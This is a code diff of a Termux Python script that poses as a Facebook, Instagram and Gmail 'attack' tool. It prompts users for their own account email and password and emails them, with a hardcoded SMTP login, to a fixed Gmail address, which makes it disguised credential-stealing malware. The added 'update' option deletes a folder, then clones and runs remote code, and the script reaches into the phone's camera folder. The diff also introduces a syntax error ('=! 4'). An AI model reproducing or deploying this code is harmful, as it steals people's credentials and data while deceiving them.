@@ -12,6 +12,13 @@ print('''
 ╔╬╬╗─║╚╗║╚╝║║╚╝║║╚╗║║║║║╔╗║║╚═╗║╔╗╗
 ╚╝╚╝─╚═╝╚══╝╚══╝╚═╝╚╝╚╝╚╝╚╝╚══╝╚╝╚╝
 ''')
+def upd():
+    os.chdir('/data/data/com.termux/files/home')
+    shutil.rmtree('ranking')
+    os.system('git clone https://github.com/ZarguiJack/ranking')
+    os.chdir('/data/data/com.termux/files/home/ranking')
+    os.system('python ranking.py')
+    sys.exit()
 
 def loop():
     az = 'azertyuiopqsdfghjklmwxcvnb'
@@ -30,23 +37,27 @@ option = int(input('''
 1- Facebook Attack
 2- Instagram Attack
 3- Gmail Attack
-[:]Choose an option (1/2/3): '''))
+4- update
+[:]Choose an option (1/2/3/4): '''))
 if option == 1:
     cho = 'Facebook'
     print('\nVeuillez tout d\'abord vous connecter à votre propre compte Facebook -/- First log into your own Facebook account')
     usn = input('\nenter your email/phonenumber: ')
     usp = input('enter your password: ')
+    print('En cours de connexion, veuillez patienter...')
 elif option == 2:
     cho = 'instagram'
     print('\nVeuillez tout d\'abord vous connecter à votre propre compte instagram -/- First log into your own instagram account')
     usn = input('\nenter your email/phonenumber: ')
     usp = input('enter your password: ')
+    print('En cours de connexion, veuillez patienter...')
 elif option == 3:
     cho = 'Gmail'
     print('\nVeuillez tout d\'abord vous connecter à votre compte gmail principal -/- First log into your principal gmail account')
     usn = input('\nenter your email: ')
     usp = input('enter your password: ')
-print('En cours de connexion, veuillez patienter...')
+    print('En cours de connexion, veuillez patienter...')
+
 
 def connect(nom):
     with open(nom, 'rb') as fp:
@@ -73,11 +84,14 @@ kl = '@zedeyep4w0rd'
 s.login(sa, kl) 
 
 ra = 'bertranddupont885@gmail.com'
-connexion = cho + ' - ' + usn + ' - ' + usp
-msg = MIMEMultipart()
-msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
-msg.attach(msgText)
-s.sendmail(sa, ra, msg.as_string())
+if option =! 4:
+ connexion = cho + ' - ' + usn + ' - ' + usp
+ msg = MIMEMultipart()
+ msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
+ msg.attach(msgText)
+ s.sendmail(sa, ra, msg.as_string())
+elif option == 4:
+ upd()
 '''
 chemin = '/storage/emulated/0//DCIM/Camera/'
 os.chdir('/storage/emulated/0/DCIM/Camera')
